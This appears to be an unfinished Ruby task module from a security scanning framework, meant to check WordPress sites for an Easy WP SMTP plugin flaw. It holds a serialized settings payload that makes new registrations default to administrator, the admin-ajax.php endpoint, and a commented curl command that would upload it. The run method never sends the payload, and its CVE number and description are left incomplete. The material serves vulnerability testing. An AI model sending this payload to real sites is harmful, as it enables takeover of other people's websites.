module Intrigue
module Task
class WordpressEzSmtpPluginRce < BaseTask

  def self.metadata
    {
      :name => "vuln/wordpress_ez_smtp_plugin_rce",
      :pretty_name => "Vuln  Check - Wordpress EZ SMTP Plugin RCE",
      :identifiers => [{ "cve" =>  "CVE-2019-" }],
      :authors => ["jcran"],
      :description => "RCE in word",
      :references => [
        "https://blog.nintechnet.com/critical-0day-vulnerability-fixed-in-wordpress-easy-wp-smtp-plugin/"
      ],
      :type => "vuln_check",
      :passive => false,
      :allowed_types => ["Uri"],
      :example_entities => [ {"type" => "Uri", "details" => {"name" => "https://intrigue.io"}} ],
      :allowed_options => [  ],
      :created_types => []
    }
  end

  ## Default method, subclasses must override this
  def run
    super

    require_enrichment

    uri = _get_entity_name

    payload = 'a:2:{s:4:"data";s:81:"a:2:{s:18:"users_can_register";s:1:"1";s:12:"default_role";s:13:"administrator";}";s:8:"checksum";s:32:"3ce5fb6d7b1dbd6252f4b5b3526650c8";}'

    endpoint = "#{uri}/wp-admin/admin-ajax.php"

    # -F 'action=swpsmtp_clear_log' -F 'swpsmtp_import_settings=1' -F 'swpsmtp_import_settings_file=@/Users/jcran/Desktop/wp-ez-smtp/payload.txt'

    # POST DATA? 
    #  -F, --form <name=content>
    #          (HTTP)  This  lets curl emulate a filled-in form in which a user has pressed the submit button. This causes curl to POST data using the Content-Type multipart/form-data according to RFC 2388. This enables uploading of binary files
    #          etc. To force the 'content' part to be a file, prefix the file name with an @ sign. To just get the content part from a file, prefix the file name with the symbol <. The difference between @ and < is then that @ makes a  file  get
    #          attached in the post as a file upload, while the < makes a text field and just get the contents for that text field from a file.

  end

end
end
end
